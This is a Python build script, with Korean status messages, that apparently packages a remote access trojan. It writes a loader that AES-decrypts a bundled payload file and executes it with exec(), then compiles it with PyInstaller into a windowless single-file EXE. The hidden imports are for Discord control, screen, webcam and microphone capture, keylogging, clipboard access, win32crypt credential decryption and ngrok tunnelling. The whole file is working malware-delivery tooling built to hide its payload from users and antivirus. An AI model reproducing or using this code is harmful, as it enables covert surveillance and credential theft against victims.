import os
import subprocess
import shutil
import sys

def create_enhanced_loader():
    loader_content = """
import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def run_payload():
    try:
        key_path = get_resource_path("secret.key")
        dat_path = get_resource_path("encrypted_payload.dat")

        with open(key_path, "rb") as k:
            key = k.read()
        with open(dat_path, "rb") as d:
            raw_data = d.read()
            iv = raw_data[:16]
            encrypted_content = raw_data[16:]

        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        original_code = unpad(cipher.decrypt(encrypted_content), AES.block_size)

        exec(original_code, {'__name__': '__main__'})
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to Exit...")

if __name__ == "__main__":
    run_payload()
"""
    with open("loader.py", "w", encoding='utf-8') as f:
        f.write(loader_content)

def build_exe():
    for folder in ['build', 'dist']:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    
    if os.path.exists('loader.spec'):
        os.remove('loader.spec')

    print("[*] 모든 의존성을 포함하여 EXE 빌드를 시작합니다...")

    icon_path = r"blabla.ico" #edit (icon setting)
    icon_arg = ["--icon", icon_path] if os.path.exists(icon_path) else []
    separator = ";"
    hidden_imports = [
        "discord.ext.commands",
        "discord.ext.tasks",
        "discord.ext.ipc",
        "discord.http",
        "discord.state",
        "discord.abc",
        "discord.enums",
        "discord.file",
        "discord.message",
        "discord.embeds",
        "discord.errors",
        "aiohttp",
        "aiohttp.client",
        "aiohttp.hdrs",
        "asyncio",
        "winreg",
        "ctypes.wintypes",
        "ctypes.util",
        "multiprocessing",
        "multiprocessing.forking",
        "multiprocessing.popen_spawn_posix",
        "multiprocessing.popen_fork",
        "multiprocessing.spawn",
        "concurrent.futures",
        "concurrent.futures.thread",
        "mss",
        "mss.screenshot",
        "PIL._tkinter_finder",
        "cv2",
        "cv2.videoio_registry",
        "sounddevice",
        "sounddevice._sounddevice",
        "pyautogui",
        "pyautogui._pyautogui_win",
        "urllib3",
        "urllib3.poolmanager",
        "urllib3.connection",
        "urllib3.util",
        "requests",
        "requests.adapters",
        "requests.sessions",
        "requests.utils",
        "pyaes",
        "pyaes.aes",
        "win32crypt",
        "win32gui",
        "flask",
        "flask.app",
        "flask.wrappers",
        "flask_socketio",
        "flask_socketio.namespace",
        "socketio",
        "socketio.server",
        "eventlet",
        "pyngrok",
        "pyngrok.ngrok",
        "psutil",
        "psutil._psutil_windows",
        "keyboard",
        "keyboard._keyboard_event",
        "pyperclip",
        "numpy",
        "numpy.core._multiarray_umath",
        "colorama",
        "colorama.ansitowin32",
        "secrets"
    ]
    collect_all_modules = [
        "discord",
        "Crypto",
        "PIL",
        "cv2",
        "sounddevice",
        "pyautogui",
        "mss",
        "psutil",
        "flask",
        "flask_socketio",
        "pyngrok"
    ]
    build_command = [
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--noconsole",
        "--clean",
        "--workpath", "build",
        "--distpath", "dist",
        *icon_arg,
    ]

    for module in collect_all_modules:
        build_command.extend(["--collect-all", module])

    for import_name in hidden_imports:
        build_command.extend(["--hidden-import", import_name])

    build_command.extend([
        "--add-data", f"encrypted_payload.dat{separator}.",
        "--add-data", f"secret.key{separator}.",
        "loader.py"
    ])

    try:
        print(f"[*] 총 {len(collect_all_modules)}개 collect-all, {len(hidden_imports)}개 hidden-import 적용")
        subprocess.run(build_command, check=True)
        
        print(f"\n[+] 빌드 성공!")
        exe_path = os.path.join("dist", "loader.exe")
        size_mb = os.path.getsize(exe_path) / (1024*1024)
        print(f"    파일: {exe_path}")
        print(f"    크기: {size_mb:.1f} MB")
        
    except subprocess.CalledProcessError as e:
        print(f"\n[-] 빌드 실패: {e}")

if __name__ == "__main__":
    required_files = ["encrypted_payload.dat", "secret.key"]
    missing = [f for f in required_files if not os.path.exists(f)]
    
    if missing:
        print(f"[-] 다음 파일이 없습니다: {missing}")
        sys.exit(1)
    
    create_enhanced_loader()
    build_exe()
